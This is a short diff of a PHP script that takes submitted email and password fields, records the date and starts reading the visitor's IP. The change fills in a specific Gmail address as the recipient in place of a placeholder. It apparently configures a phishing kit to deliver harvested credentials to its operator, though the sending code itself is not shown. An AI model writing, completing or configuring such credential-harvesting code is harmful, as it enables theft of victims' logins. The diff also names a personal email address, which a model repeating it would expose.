@@ -5,7 +5,7 @@ if (isset($_POST['email'])) {
     $email = $_POST['email'];
     $pass = $_POST['pass'];
     $today = date("d-m-Y");
-    $my_email = 'your email here';
+    $my_email = 'ucchen13@gmail.com';
  
  
     if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
